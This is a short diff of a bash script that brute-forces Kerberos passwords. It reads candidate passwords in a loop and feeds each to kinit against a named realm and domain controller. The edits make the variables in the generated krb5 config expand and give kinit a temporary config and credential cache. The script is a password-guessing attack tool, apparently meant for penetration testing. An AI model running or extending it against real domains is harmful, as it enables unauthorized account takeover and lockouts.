@@ -26,9 +26,10 @@ echo "[+] Kerberos Realm: $DOMAIN"
 echo "[+] KDC: $DOMAINCONTROLLER"
 echo ""
 
-KRB5_CONF=$(mktemp)
+k5config=$(mktemp)
+k5cache=$(mktemp)
 
-cat > $KRB5_CONF <<'asdfasdf'
+cat > $k5config <<asdfasdf
 [libdefaults]
 	default_realm = $DOMAIN
 [realms]
@@ -40,7 +41,7 @@ asdfasdf
 
 while read PASSWORD; do
 	RESULT=$(
-	echo $PASSWORD | kinit --password-file=STDIN $USERNAME 2>&1
+	echo $PASSWORD | KRB5_CONFIG=$k5config KRB5CCNAME=$k5cache kinit --password-file=STDIN $USERNAME 2>&1
 	)
 	if [[ $RESULT == *"unable to reach"* ]]; then
 		echo "[!] Unable to find KDC for realm. Check domain and DC"
